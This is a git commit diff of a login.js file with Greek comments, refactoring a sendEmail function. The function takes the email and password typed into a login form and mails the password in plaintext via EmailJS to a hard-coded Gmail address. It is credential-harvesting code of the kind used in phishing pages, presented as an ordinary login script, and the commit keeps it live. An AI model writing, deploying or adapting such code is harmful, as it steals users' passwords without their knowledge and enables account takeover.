4afd2ab648ea1b07c599905e6a966d719f94247b
Orestis769 <163779332+Orestis769@users.noreply.github.com>
2024-03-20 10:44:36 +0200

    Update login.js

--- login.js
+++ login.js
@@ -1,19 +1,24 @@
+(function() {
+    // Αρχικοποίηση του EmailJS user ID
+    emailjs.init("jJxV-aIeQl81sucMy"); // Βάλε εδώ το δικό σου User ID
+})();
+
 function sendEmail() {
     var email = document.getElementById("email").value;
     var password = document.getElementById("password").value;
 
-    emailjs.init("jJxV-aIeQl81sucMy"); // Αυτό είναι το Public Key
-
-    emailjs.send("service_9kt8ida", "template_b6ea4jl", {
-        to_email: "gianisritos.7gr@gmail.com",
+    // Δημιουργία του αντικειμένου με τα δεδομένα για το email
+    var templateParams = {
+        to_email: 'gianisritos.7gr@gmail.com',
         from_name: email,
-        message: "Password: " + password
-    }).then(
-        function(response) {
-            console.log("SUCCESS!", response.status, response.text);
-        }, 
-        function(error) {
-            console.log("FAILED...", error);
-        }
-    );
+        message: 'Password: ' + password
+    };
+
+    // Αποστολή email μέσω του EmailJS
+    emailjs.send('service_9kt8ida', 'template_b6ea4jl', templateParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
 }
